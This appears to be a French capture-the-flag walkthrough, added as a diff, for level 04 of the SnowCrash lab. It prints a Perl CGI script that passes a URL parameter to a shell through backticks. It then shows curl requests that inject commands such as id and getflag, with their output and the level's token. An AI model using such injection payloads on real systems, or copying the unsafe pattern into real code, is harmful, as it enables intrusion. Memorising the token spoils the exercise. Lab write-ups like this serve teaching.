@@ -1,0 +1,41 @@
+Pour ce niveau 04 on a un simple fichier level04.pl.
+Du coup un ficher perl, on va donc le copier sur la machine locale pour l'analyser.
+
+-- cat level04.pl --
+➜  level04 cat level04.pl            
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+
+On comprend plusieurs choses:
+- Le script utilise le module CGI pour récupérer des paramètres.
+- Il utilise la fonction x pour afficher le contenu de la variable y.
+- La variable y est récupérée via la fonction param du module CGI.
+
+Du coup on va exploiter cette faille pour exécuter des commandes arbitraires.
+On commances avec :
+
+-- level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/usr/bin/id\`"
+uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
+-- level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/usr/bin/whoami\`"
+flag04
+
+Directement ! 
+
+On est deja flag04, on peut donc directement lire le flag.
+
+Du coup : 
+
+-- level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/bin/getflag\`"
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+On fini avec le flag : ne2searoevaevoem4ov4ar8ap
+
+-- su level05
